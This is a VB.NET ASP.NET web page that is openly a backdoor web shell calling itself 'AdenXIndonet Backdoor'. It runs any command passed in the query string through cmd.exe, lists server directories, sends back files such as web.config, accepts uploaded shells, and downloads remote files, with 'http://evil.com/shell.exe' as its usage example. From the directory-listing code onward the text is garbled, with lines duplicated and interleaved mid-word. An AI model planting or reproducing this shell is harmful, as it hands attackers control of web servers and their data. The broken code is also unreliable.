<%@ Page Language="VB" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Net" %>

<script runat="server">
    
    ' AdenXIndonet Backdoor - VB.NET Version 🩸🔥
    
    Protected Sub Page_Load(ByVal sender As Object, ByVal e As EventArgs)
        Dim cmd As String = Request.QueryString("cmd")
        Dim action As String = Request.QueryString("action")
        Dim file As String = Request.QueryString("file")
        Dim url As String = Request.QueryString("url")
        
        Response.Clear()
        Response.ContentType = "text/plain"
        
        If cmd IsNot Nothing AndAlso cmd <> "" Then
            ExecuteCommand(cmd)
        ElseIf action = "list" Then
            ListDirectory(file)
        ElseIf action = "download" AndAlso file IsNot Nothing Then
            DownloadFile(file)
        ElseIf action = "wget" AndAlso url IsNot Nothing Then
            WgetFile(url)
        ElseIf action = "upload" AndAlso file IsNot Nothing Then
            HandleUpload(file)
        Else
            Response.Write("AdenXIndonet Backdoor Active - VB.NET Version!" & vbCrLf)
            Response.Write("?cmd=whoami" & vbCrLf)
            Response.Write("?action=list&file=C:\" & vbCrLf)
            Response.Write("?action=download&file=web.config" & vbCrLf)
            Response.Write("?action=wget&url=http://evil.com/shell.exe" & vbCrLf)
            Response.Write("?action=upload&file=shell.aspx (POST with file)" & vbCrLf)
        End If
        
        Response.End()
    End Sub
    
    Private Sub ExecuteCommand(ByVal command As String)
        Try
            Response.Write("Executing: " & command & vbCrLf & vbCrLf)
            
            Dim psi As New ProcessStartInfo()
            psi.FileName = "cmd.exe"
            psi.Arguments = "/c " & command
            psi.RedirectStandardOutput = True
            psi.RedirectStandardError = True
            psi.UseShellExecute = False
            psi.CreateNoWindow = True
            
            Dim p As Process = Process.Start(psi)
            Dim output As String = p.StandardOutput.ReadToEnd()
            Dim [error] As String = p.StandardError.ReadToEnd()
            p.WaitForExit()
            
            Response.Write(output)
            If [error] <> "" Then
                Response.Write(vbCrLf & "[ERROR]" & vbCrLf & [error])
            End If
        Catch ex As Exception
            Response.Write("Error: " & ex.Message)
        End Try
    End Sub
    
    Private Sub ListDirectory(ByVal path As String)
        Try
            If path Is Nothing OrElse path = "" Then
                path = Server.MapPath("~/")
            End If
            
            If Directory.Exists(path) Then
                Response.Write("Directory: " & path & vbCrLf & vbCrLf)
                
                ' Directories
                Response.Write("[DIRECTORIES]" & vbCrLf)
                For Each dir As String In Directory.GetDirectories(path)
                    Dim di As New DirectoryInfo(dir)
                    Response.Write("[DIR] " & di.Name & vbCrLf)
                Next
                
                ' Files
                Response.Write(v                Response.Write(vbCrbCrLfLf & & "[FILES "[FILES]" &]" & vbCr vbCrLfLf)
                For Each)
                For Each f f As As String In Directory String In Directory.GetFiles(path)
.GetFiles(path)
                    Dim                    Dim fi As New File fi AsInfo(f)
                    New FileInfo(f Response.Write)
                    Response(fi.Write(fi.Name & " -.Name & " - " & " & fi.Length fi.Length & " & " bytes - bytes - " & " & fi.Last fi.LastWriteTime.ToStringWriteTime.ToString() &() & vbCr vbCrLfLf)
               )
                Next
            ElseIf File.Exists(path) Then
                DownloadFile(path)
            Else
                Response.Write Next
            ElseIf File.Exists(path) Then
                DownloadFile(path)
            Else
                Response.Write("Path not found("Path: " not found: " & path)
            & path)
            End If End If
       
        Catch ex Catch ex As Exception As Exception
           
            Response.Write Response.Write("Error("Error listing directory listing directory: ": " & ex & ex.Message)
        End.Message)
 Try
        End Try
    End    End Sub
    
 Sub
    
    Private    Private Sub Download Sub DownloadFile(ByFile(ByVal fileVal filePath AsPath As String)
 String)
        Try        Try
           
            If File.Exists If File.Exists(filePath(filePath) Then
               ) Then
                Response.Clear Response.Clear()
               ()
                Response.Content Response.ContentType =Type = "application "application/oct/octet-streamet-stream"
                Response.Append"
                Response.AppendHeader("Header("Content-DispositionContent-Disposition", "", "attachment;attachment; filename=" & Path filename=" & Path.GetFileName.GetFileName(filePath(filePath))
               ))
                Response. Response.TransmitTransmitFile(fileFile(filePath)
                ResponsePath)
.Fl                Response.Flush()
ush()
                Response.End()
                Response.End()
            Else            Else
                Response.Write
                Response.Write("File not found("File: " not found & file: " & filePath)
Path)
            End            End If If

        Catch        Catch ex As ex As Exception
 Exception
            Response            Response.Write(".Write("Error downloadingError downloading file: " & file: " & ex.Message ex.Message)
        End Try
   )
        End Try
    End Sub End Sub
    
   
    
    Private Private Sub Wget Sub WgetFile(ByFile(ByVal urlVal url As As String String)
       )
        Try
 Try
            Dim            Dim fileName As fileName As String = String = Path.Get Path.GetFileName(url)
FileName(url)
                       If fileName If fileName = "" = "" Then
                fileName Then
                fileName = " = "downloadeddownloaded_" &_" & DateTime.Now.Ticks DateTime.Now.Ticks.ToString().ToString() & ". & ".exexe"
e"
            End            End If
            
 If
            
            Dim            Dim savePath savePath As String As String = Server.MapPath("~/") & = Server.MapPath("~/") & fileName
            
            Using fileName
            
            Using client As client As New Web New WebClient()
Client()
                client                client.DownloadFile(url, save.DownloadFile(url, savePath)
            EndPath)
            End Using
            
 Using
            
            Response.Write("            Response.Write("File downloadedFile downloaded successfully to successfully to: ": " & save & savePath)
Path)
        Catch ex As Exception
            Response.Write        Catch ex As Exception
            Response.Write("Error downloading("Error downloading file: file: " & " & ex.Message)
        ex.Message)
        End Try End Try
   
    End Sub End Sub
    
   
    
    Private Sub Private Sub HandleUpload HandleUpload(ByVal(ByVal fileName As fileName As String)
 String)
        Try        Try
           
            If Request If Request.Files.Files.Count > 0.Count > Then
 0 Then
                Dim                Dim uploadedFile As Http uploadedFilePostedFile As HttpPostedFile = Request = Request.Files(0.Files(0)
               )
                Dim save Dim savePath AsPath As String = String = Server.Map Server.MapPath("Path("~/")~/") & fileName & fileName
               
                uploadedFile uploadedFile.SaveAs.SaveAs(save(savePath)
Path)
                               Response Response.Write(".Write("File uploadedFile uploaded successfully to: " successfully to: " & save & savePath)
Path)
            Else            Else
               
                Response.Write Response.Write("No("No file uploaded file uploaded. Send. Send file file as as POST data.")
            End POST data.")
 If
            End If
        Catch        Catch ex ex As Exception As Exception
            Response.Write("
            Response.Write("Error uploading file:Error uploading file: " & " & ex.Message ex.Message)
       )
        End Try
    End Try
    End Sub End Sub
    
</script>

    
</script>